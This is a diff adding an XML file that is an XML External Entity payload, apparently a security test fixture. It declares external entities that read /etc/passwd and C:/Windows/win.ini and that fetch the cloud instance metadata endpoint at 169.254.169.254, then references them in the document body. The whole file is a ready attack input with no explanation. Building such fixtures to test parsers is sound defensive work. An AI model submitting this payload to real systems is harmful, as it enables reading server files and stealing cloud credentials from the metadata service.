@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe_win SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>
+  <data>&xxe;</data>
+  <data_win>&xxe_win;</data_win>
+  <ssrf_test>&ssrf;</ssrf_test>
+</root>
